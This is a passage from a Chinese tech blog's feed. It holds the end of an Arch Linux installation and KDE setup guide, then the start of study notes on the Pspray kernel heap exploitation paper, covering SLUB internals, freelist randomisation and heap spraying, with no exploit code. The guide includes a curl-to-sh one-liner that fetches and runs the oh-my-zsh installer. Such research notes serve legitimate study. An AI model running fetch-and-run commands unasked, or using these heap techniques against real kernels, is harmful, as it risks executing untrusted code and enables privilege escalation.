/dev/nvme0n1p6</span><br></code></pre></td></tr></table></figure><h3 id="正式安装"><a href="#正式安装" class="headerlink" title="正式安装"></a>正式安装</h3><p>接下来首先挂载新分区，之后在内部创建 <code>/boot</code> 目录，并将 Windows 原有的 EFI 分区挂载到 <code>/boot</code> 目录下，这里注意看自己对应的分区名：</p><blockquote><p>update：这里笔者非常错误地让 Windows  和 Arch 使用了同一个 EFI 分区，导致了后面一系列事故的发生， <em>虽然说不是不能用吧</em> ，但为了更好的体验，笔者还是建议大家为 Linux 准备一个独立的 EFI 分区</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mount /dev/nvme0n1p6 /mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/boot</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">mount /dev/nvme0n1p1 /mnt/boot</span><br></code></pre></td></tr></table></figure><p>接下来使用该命令进行安装基本的环境，这里笔者安装默认的内核版本 <code>linux</code>，你也可以在 <a href="https://wiki.archlinuxcn.org/wiki/%E5%86%85%E6%A0%B8">Wiki</a> 上选择自己想要的内核（比如说带有安全加固的 <code>linux-hardened</code>）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacstrap /mnt base linux linux-firmware</span><br></code></pre></td></tr></table></figure><p>安装完成之后接下来我们来对系统进行一些基本配置，首先是生成 fstab（文件系统表）文件：</p><blockquote><p>这个文件用以决定系统启动时将某些分区挂载到指定目录的操作细节，也可以手写（建议用 UUID 而不是 <code>/dev</code> 路径进行指定）</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br></code></pre></td></tr></table></figure><p>接下来使用 <code>arch-chroot</code> 命令切换到新的系统环境中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">arch-chroot /mnt</span><br></code></pre></td></tr></table></figure><p>然后是设置时区，笔者现在在墨尔本所以时区设置为墨尔本，如果你在中国大陆则需要设置为 <code>Asia/Shanghai</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br></code></pre></td></tr></table></figure><p>接下来生成 <code>/etc/adjtime</code> 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">hwclock --systohc</span><br></code></pre></td></tr></table></figure><p>然后创建主机名，这里就随便了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3-Arch&quot;</span> &gt; /etc/hostname</span><br></code></pre></td></tr></table></figure><p>在 <code>/etc/hosts</code> 中写入如下内容，这里注意改成自己的 hostname：</p><p><img src="https://s2.loli.net/2023/09/18/hdjHysTvP8KlqA4.png"></p><p>设置 root 密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">passwd</span><br></code></pre></td></tr></table></figure><p>安装一些基本的软件包，这里我们选择使用 <code>grub</code> 作为启动器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S grub efibootmgr networkmanager network-manager-applet dialog wireless_tools wpa_supplicant os-prober mtools dosfstools ntfs-3g base-devel linux-headers reflector git sudo vim</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S intel-ucode <span class="hljs-comment"># 如果你是 AMD 则需要改成 amd-ucode</span></span><br></code></pre></td></tr></table></figure><p>配置 GRUB 自动启用 <code>os-prober</code>，这个程序用来检测磁盘上的 Windows Boot Manager 并自动创建 Grub entry,这里只需要在 <code>/etc/default/grub</code> 中加入一行 <code>GRUB_DISABLE_OS_PROBER=false</code> ，并输入如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Arch</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span><br></code></pre></td></tr></table></figure><p>到这一步一个基本的 Arch 环境就安装好了，完成之后输入如下命令进行重启进入系统，别忘了拔出移动安装介质：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">exit</span>        <span class="hljs-comment"># 退出 arch-chroot</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">umount -a   <span class="hljs-comment"># 取消分区挂载</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">reboot      <span class="hljs-comment"># 重启</span></span><br></code></pre></td></tr></table></figure><blockquote><p>后面如果想再进入 Windows 只需要进 BIOS 调整启动顺序即可</p></blockquote><h1 id="0x03-常规系统配置"><a href="#0x03-常规系统配置" class="headerlink" title="0x03. 常规系统配置"></a>0x03. 常规系统配置</h1><p>接下来是一些常规系统配置，包括新建用户、配置 GUI 等</p><h3 id="启动网络"><a href="#启动网络" class="headerlink" title="启动网络"></a>启动网络</h3><p>通过如下命令启动网络并连接 WiFi：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> --now NetworkManager</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmtui</span><br></code></pre></td></tr></table></figure><p>进入这个界面后选 <code>Activate a connection</code>，然后就正常选 WiFi 输密码连接就行，这个只用最开始的时候弄一次：</p><p><img src="https://s2.loli.net/2023/09/18/34f1eJYGojnX2xq.jpg"></p><p>DHCP 相关的一些配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S dhcpcd</span><br></code></pre></td></tr></table></figure><h3 id="bash-自动补全"><a href="#bash-自动补全" class="headerlink" title="bash 自动补全"></a>bash 自动补全</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S bash-completion</span><br></code></pre></td></tr></table></figure><h3 id="设置-Locale-进行本地化"><a href="#设置-Locale-进行本地化" class="headerlink" title="设置 Locale 进行本地化"></a>设置 Locale 进行本地化</h3><p>去掉 <code>/etc/locale.gen</code> 中 <code>en_US.UTF-8</code> 所在行以及 <code>zh_CN.UTF-8</code> 所在行开头的 <code>#</code>，然后在 <code>/etc/locale.conf</code> 中写入一行 <code>LANG=en_US.UTF-8</code> 即可</p><h3 id="创建新用户"><a href="#创建新用户" class="headerlink" title="创建新用户"></a>创建新用户</h3><p>没啥好说的，老一套东西，这里别忘了改成自己的用户名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">groupadd arttnba3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">useradd -m -s /bin/bash -g arttnba3 arttnba3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">passwd arttnba3</span><br></code></pre></td></tr></table></figure><p>授予 sudo 权限，这里注意我们<strong>应当且仅应当使用 visudo，而非直接编辑 &#x2F;etc&#x2F;sudoers 文件</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">usermod -aG wheel arttnba3 <span class="hljs-comment"># arch 下的 sudo 组</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">EDITOR=vim visudo</span><br></code></pre></td></tr></table></figure><p>去掉如下图所示这一行的前面的 <code>#</code> 注释即可，笔者这里是已经修改过后的版本：</p><p><img src="https://s2.loli.net/2023/09/18/dpNtu5qs4hCGSmD.png"></p><h3 id="配置桌面环境"><a href="#配置桌面环境" class="headerlink" title="配置桌面环境"></a>配置桌面环境</h3><p>笔者选择安装 <code>Wayland + KDE Plasma</code>，首先安装基本的 KDE Plasma 桌面组件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S plasma-meta konsole dolphin</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> sddm</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S egl-wayland kde-applications-meta sway alacritty waybar wofi xorg-xwayland xorg-xlsclients qt5-wayland glfw-wayland</span><br></code></pre></td></tr></table></figure><blockquote><p>这里会有一些不同的 provider 供选择，按自己喜欢的选就好：</p><p><img src="https://s2.loli.net/2023/09/19/XRjHPuoTIzFxUdB.png"></p><p>需要注意的是 KDE <a href="https://community.kde.org/Distributions/Packaging_Recommendations#Non-Plasma_packages">仅推荐VLC后端</a>，因为GStreamer<a href="https://invent.kde.org/libraries/phonon-gstreamer/-/issues/1">不再维护</a>：</p></blockquote><p>之后重启就能进图形化的桌面了，说实话有点丑 ：(</p><p><img src="https://s2.loli.net/2023/09/19/W1q4dgVSibDeF2t.jpg"></p><p>配置默认开启小键盘只需要在 <code>/etc/sddm.conf</code> 文件中添加如下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[General]<br>Numlock=on<br></code></pre></td></tr></table></figure><h3 id="开启-32-位支持库"><a href="#开启-32-位支持库" class="headerlink" title="开启 32 位支持库"></a>开启 32 位支持库</h3><p>将 <code>/etc/pacman.conf</code> 中 <code>[multilib]</code> 所在的那两行开头的 <code>#</code>去掉，然后 <code>pacman -Syyu</code> 即可</p><h3 id="更换包管理器为-AUR"><a href="#更换包管理器为-AUR" class="headerlink" title="更换包管理器为 AUR"></a>更换包管理器为 AUR</h3><p>照着文档做就行，这里笔者就懒得自己编译了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S --needed git base-devel</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://aur.archlinux.org/yay-bin.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> yay-bin</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">makepkg -si</span><br></code></pre></td></tr></table></figure><h3 id="禁用-iwd"><a href="#禁用-iwd" class="headerlink" title="禁用 iwd"></a>禁用 iwd</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">disable</span> iwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl stop iwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now NetworkManager</span><br></code></pre></td></tr></table></figure><h3 id="基础功能包与中文字体安装"><a href="#基础功能包与中文字体安装" class="headerlink" title="基础功能包与中文字体安装"></a>基础功能包与中文字体安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S sof-firmware alsa-firmware alsa-ucm-conf          <span class="hljs-comment"># 一些可能需要的声音固件</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S adobe-source-han-serif-cn-fonts wqy-zenhei        <span class="hljs-comment"># 开源中文字体</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S noto-fonts-cjk noto-fonts-emoji noto-fonts-extra  <span class="hljs-comment"># 谷歌开源字体及表情</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S ark</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S p7zip unrar unarchiver lzop lrzip                 <span class="hljs-comment"># ark 的可选依赖</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S google-chrome</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S packagekit-qt5 packagekit appstream-qt appstream gwenview wget kate <span class="hljs-built_in">bind</span> <span class="hljs-comment"># 图片查看器和其他工具等</span></span><br></code></pre></td></tr></table></figure><h3 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h3><p>笔者用的 fcitx：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S fcitx5-im</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S fcitx5-chinese-addons <span class="hljs-comment"># 中文输入引擎</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S fcitx5-pinyin-zhwiki  <span class="hljs-comment"># 中文维基百科词库</span></span><br></code></pre></td></tr></table></figure><p>之后使用 <code>EDITOR=vim sudoedit /etc/environment</code> 命令在对应文件中添加如下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">GTK_IM_MODULE=fcitx<br>QT_IM_MODULE=fcitx<br>XMODIFIERS=@im=fcitx<br>SDL_IM_MODULE=fcitx<br></code></pre></td></tr></table></figure><p>之后在系统设置里便可进行相应的配置</p><h3 id="启用蓝牙并安装蓝牙音频设备"><a href="#启用蓝牙并安装蓝牙音频设备" class="headerlink" title="启用蓝牙并安装蓝牙音频设备"></a>启用蓝牙并安装蓝牙音频设备</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S bluez bluez-utils</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now bluetooth</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S pulseaudio-bluetooth</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pulseaudio -k</span><br></code></pre></td></tr></table></figure><h3 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h3><p>首先安装 Intel 核显驱动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel</span><br></code></pre></td></tr></table></figure><p>如果你和笔者一样还有一张 N 卡则使用如下命令安装驱动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S nvidia nvidia-settings lib32-nvidia-utils</span><br></code></pre></td></tr></table></figure><blockquote><p>这里笔者没有安装 <code>optimus-manager</code>， 因为一安就进不去桌面了，看了半天日志找了半天解决方案都没能解决（悲）</p><p>因为目前对续航其实没有过于极限的要求，独显集显混合输出的情况下还是能轻度工作3h左右的，因此暂时不考虑继续整这玩意了：）</p></blockquote><h1 id="0x04-桌面美化"><a href="#0x04-桌面美化" class="headerlink" title="0x04. 桌面美化"></a>0x04. 桌面美化</h1><h3 id="启动界面美化"><a href="#启动界面美化" class="headerlink" title="启动界面美化"></a>启动界面美化</h3><p>直接在 <code>System Settings-&gt;Startup and Shutdown-&gt;Login Screen(SDDM)</code> 里就能改，笔者这里直接选了 <code>Breeze</code></p><h3 id="桌面风格美化"><a href="#桌面风格美化" class="headerlink" title="桌面风格美化"></a>桌面风格美化</h3><p>直接在 <code>System Settings-&gt;Appearance-&gt;Global Theme</code> 里选择自己喜欢的主题安装上然后再 apply 就行，或者也可以自己去 <a href="https://store.kde.org/">https://store.kde.org</a> 进行下载，笔者选择的是国人设计师 <a href="https://github.com/vinceliuice">vinceliuice</a> 开发的 <a href="https://github.com/vinceliuice/MacVentura-kde">MacVentura KDE theme</a> 主题</p><h3 id="安装-Dock"><a href="#安装-Dock" class="headerlink" title="安装 Dock"></a>安装 Dock</h3><p>在底下有个 Mac 样式的 Dock 还是相对来说比较养眼一些，这里笔者安装的是 <code>latte-dock</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S latte-dock</span><br></code></pre></td></tr></table></figure><p>然后 <code>alt + f2</code> 输入 <code>latte</code> 就 ok 了</p><p>最后再摆放各种 widgets 调一调 panel 位置啥的差不多就 ok 了，整体效果如下：</p><p><img src="https://s2.loli.net/2023/09/20/3bdIi6KA9c2ulNV.png"></p><h1 id="0x05-一些报错的解决"><a href="#0x05-一些报错的解决" class="headerlink" title="0x05. 一些报错的解决"></a>0x05. 一些报错的解决</h1><h3 id="pcieport-报错"><a href="#pcieport-报错" class="headerlink" title="pcieport 报错"></a>pcieport 报错</h3><p>启动起来发现内核莫名其妙吐了一大堆的奇怪的东西：</p><p><img src="https://s2.loli.net/2023/09/18/m71oVX2g489Or5s.jpg"></p><p>在 <code>/boot/grub/grub.cfg</code> 中找到内核启动参数，添加上 <code>pci=nommconf</code> 即可</p><h3 id="chrome-无法播放视频"><a href="#chrome-无法播放视频" class="headerlink" title="chrome 无法播放视频"></a>chrome 无法播放视频</h3><p>就一直卡在加载界面不动，参见 <a href="https://wiki.archlinux.org/title/PulseAudio/Troubleshooting#Browsers_load_videos_but_do_no_play">Wiki</a> 使用如下命令可以临时解决：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pulseaudio --<span class="hljs-built_in">kill</span> &amp;&amp; pulseaudio --start</span><br></code></pre></td></tr></table></figure><p>完美的解决方案是是用 <code>pipewire-pulse</code> 替换掉 <code>pluseaudio</code> 与 <code>pluseaudio-bluetooth</code>，然后重启：</p><blockquote><p>安装这个包的时候会自动把另外两个包给卸了</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S pipewire-pulse</span><br></code></pre></td></tr></table></figure><h1 id="0x06-个人配置优化"><a href="#0x06-个人配置优化" class="headerlink" title="0x06. 个人配置优化"></a>0x06. 个人配置优化</h1><h3 id="触摸板开启点按即单击"><a href="#触摸板开启点按即单击" class="headerlink" title="触摸板开启点按即单击"></a>触摸板开启点按即单击</h3><p>触摸板习惯性的操作应当是按一下就是单击，而非按下机械左键才是单击， KDE 默认是关闭了这个选项，不过我们在系统设置中的 <code>Hardware→Input Devices→Touchpad</code> 里将 <code>Tap-to-click</code> 勾选上即可</p><h3 id="触摸板上下滑动方向改变"><a href="#触摸板上下滑动方向改变" class="headerlink" title="触摸板上下滑动方向改变"></a>触摸板上下滑动方向改变</h3><p>笔者的使用习惯中双指滑动是上下反向，KDE 中默认是上下同向，这里只需要在系统设置中的 <code>Hardware→Input Devices→Touchpad</code> 里将 <code>Invert scroll direction (Natual scrolling)</code> 勾选上即可</p><h3 id="设置双击打开文件"><a href="#设置双击打开文件" class="headerlink" title="设置双击打开文件"></a>设置双击打开文件</h3><p>Dolphin 中默认单击就打开文件了，而对于笔者来说更习惯 Windows 那样的单击选择双击打开的模式，这里只需要在系统设置中的 <code>Workspace Behaviour-&gt;General Behaviour</code> 中勾选 <code>Selects them</code> 即可</p><h3 id="使用-zsh-替换-bash"><a href="#使用-zsh-替换-bash" class="headerlink" title="使用 zsh 替换 bash"></a>使用 zsh 替换 bash</h3><p><code>Z Shell</code> 是一个比默认自带的 <code>bash</code> 更加强大的 shell，这里我们通过如下命令即可将当前用户的默认 shell 替换为 zsh：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S zsh</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sh -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><br></code></pre></td></tr></table></figure><p>后面各种主题啥的配置可以参照<a href="https://zhuanlan.zhihu.com/p/58073103">知乎上的这篇文章</a>，笔者用的是 <code>gnzh</code> 主题</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;不好用，在安装界面睡了三个小时&lt;/p&gt;</summary>
    
    
    
    <category term="DISTRO" scheme="https://arttnba3.github.io/categories/DISTRO/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Arch Linux" scheme="https://arttnba3.github.io/tags/Arch-Linux/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x03】论文笔记：Pspray: Timing Side-Channel based Linux Kernel Heap Exploitation Technique </title>
    <link href="https://arttnba3.github.io/2023/09/16/PAPER-0X03-PSPRAY/"/>
    <id>https://arttnba3.github.io/2023/09/16/PAPER-0X03-PSPRAY/</id>
    <published>2023-09-15T18:02:37.000Z</published>
    <updated>2023-09-15T08:56:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>🎵THIS IS MY KINGDOM C*M🎵</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>Linux kernel exploitation 方向的论文虽然数量极少，但能上顶会的大部分都还挺有意思的，尤其是发在 USENIX 2023 上的<a href="https://www.usenix.org/conference/usenixsecurity23/presentation/lee-yoochan">这一篇论文</a>笔者觉得是<strong>非常有实战价值</strong>的（笑），因此简单做个小笔记</p><p>因为这一领域的论文读起来比较轻松所以这一篇笔者只会记录其中比较精华的部分，部分地方不一定保留论文原文（而是会选择同义词代换</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>攻击的隐秘性对于攻击者而言是最为至关重要的，因为一旦攻击被发现就寄了，但由于 SLUB 分配器的构造的缘故成功完成漏洞利用的概率都较低</p><p>本文提出 $Pspray$ ：<strong>一项基于时序侧信道的漏洞利用技术</strong>，经测试这项技术可以显著提高漏洞利用的成功率</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p><del>没必要讲.jpg</del></p></blockquote><p>Linux kernel 有着如 KCFI、KASLR、KDFI 在内的多种保护措施，这使得攻击者难以成功完成利用</p><p>对攻击者而言攻击的隐秘性是最重要的需求之一，若攻击失败则将会被防守方发现，因为这通常会留下痕迹（例如 kernel panic），因此攻击者非常需要提高攻击的成功率</p><p>内核漏洞大都为堆上漏洞（例如由 syzkaller 找到的 1107 个漏洞中有 968 个都是堆相关的），而对攻击者而言要完成利用十分困难，因为这需要攻击者能预测当前的堆分配器状态，而内核堆管理器 SLUB 的结构使其难以被完成</p><blockquote><p>这里原论文还举了个例子，👴就⑧摘抄了，毕竟看这篇论文的前提肯定是默认带🔥都是会点 kernel pwn 的，<del>不会 kernel pwn 你看这篇论文干啥嘛</del></p></blockquote><p>本文提出一种名为 $PSPRAY$ 的新的内核堆利用手法，其可以显著地提升对抗 slab freelist 随机化等保护措施的堆利用的成功率，更具体地说， $PSPRAY$ 的核心是使用时序侧信道来间接获取 slab 的分配状态</p><p>本文工作总结如下：</p><ul><li><strong>分析了堆利用的失败情况</strong></li><li><strong>新的堆利用技术</strong></li><li><strong>新的防御技术</strong></li></ul><h1 id="0x02-Background"><a href="#0x02-Background" class="headerlink" title="0x02. Background"></a>0x02. Background</h1><h2 id="2-1-SLUB-allocator"><a href="#2-1-SLUB-allocator" class="headerlink" title="2.1 SLUB allocator"></a>2.1 SLUB allocator</h2><blockquote><p>建议直接看👴的<a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">这篇博客</a></p></blockquote><h4 id="The-architecture-of-SLUB-allocator"><a href="#The-architecture-of-SLUB-allocator" class="headerlink" title="The architecture of SLUB allocator"></a>The architecture of SLUB allocator</h4><p>SLUB 是 Linux kernel 默认的堆分配器，其基本结构如图 1 所示，其包含了多个不同类型与尺寸的 <code>kmem_cache</code> 内存池，每个 <code>kmem_cache</code> 都有一个 per-CPU 内存池，其中包含独立的 $freelist$ 、$page$ 、$partial$ ，$freelist$ 为一个基于 $page$ 页面上空闲对象所组成的单向链表</p><p>除了 $freelist$  以外，每个 slab 都有自己独立的 $freelist$ ；除了 $CPU\ partial\ page\ freelist$ 以外，每个 node 也有自己独立的 $CPU\ partial\ page\ freelist$ ，在  $CPU\ partial\ page\ freelist$ 用完之后启用</p><p><img src="https://s2.loli.net/2023/09/13/JNkMTZ1s7RQ4DqB.png"></p><h4 id="Allocation-sequence-of-SLUB-allocator"><a href="#Allocation-sequence-of-SLUB-allocator" class="headerlink" title="Allocation sequence of SLUB allocator"></a>Allocation sequence of SLUB allocator</h4><p>图 2 展示了 SLUB 的分配流程：</p><ul><li>首先尝试从 $CPU\ freelist$ 上取</li><li>$CPU-freelist$ 为空，尝试从 $CPU\ page$ 上取 $freelist$，给回  $CPU\ freelist$ （可以理解为 percpu freelist 的初始化）</li><li>$CPU-page$ 也空了，尝试从 $CPU\ partial$ 链表上取</li><li>$CPU\ partial$ 链表也空了，尝试从  $NODE\ partial$ 链表上取</li><li>$NODE\ partial$ 链表也空了，只好转向 $Buddy\ System$ 请求分配新的内存页</li></ul><blockquote><p>buddy system 也空了就该 OOM kill 了（悲</p></blockquote><p><img src="https://s2.loli.net/2023/09/13/zGYbCeZSf41IqdF.png"></p><h2 id="2-2-Slab-Freelist-Random"><a href="#2-2-Slab-Freelist-Random" class="headerlink" title="2.2 Slab Freelist Random"></a>2.2 Slab Freelist Random</h2><p>简单来说就是 <code>CONFIG_SLAB_FREELIST_RANDOM</code> 这个保护的开启会使得 $freelist$ 的初始化更加随机化，空闲对象链表连接不再按常规的地址顺序连接，而是会被打乱</p><p><img src="https://s2.loli.net/2023/09/13/fUMnhteR78rXZOA.png"></p><h1 id="0x03-Exploitation-method-and-failure-cases"><a href="#0x03-Exploitation-method-and-failure-cases" class="headerlink" title="0x03. Exploitation method and failure cases"></a>0x03. Exploitation method and failure cases</h1><p>本节主要讲常规的漏洞利用手法</p><h2 id="3-1-Out-Of-Bounds"><a href="#3-1-Out-Of-Bounds" class="headerlink" title="3.1 Out-Of-Bounds"></a>3.1 Out-Of-Bounds</h2><h4 id="Exploitation-method"><a href="#Exploitation-method" class="headerlink" title="Exploitation method"></a>Exploitation method</h4><p>OOB 就是越界读写，通常来说我们需要在漏洞对象后面放一个被溢出的目标对象，最简单的做法就是直接<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x06-Kernel-Heap-Heap-Spraying">堆喷</a>就完事了</p><p><img src="https://s2.loli.net/2023/09/13/E9hJxTW1ajNmvYe.png"></p><h4 id="Failure-cases"><a href="#Failure-cases" class="headerlink" title="Failure cases"></a>Failure cases</h4><p>但因为地址随机化的存在，我们的被溢出目标对象不一定能恰好落在漏洞对象后面，中间可能隔了几个对象或者直接就错位了：(</p><p><img 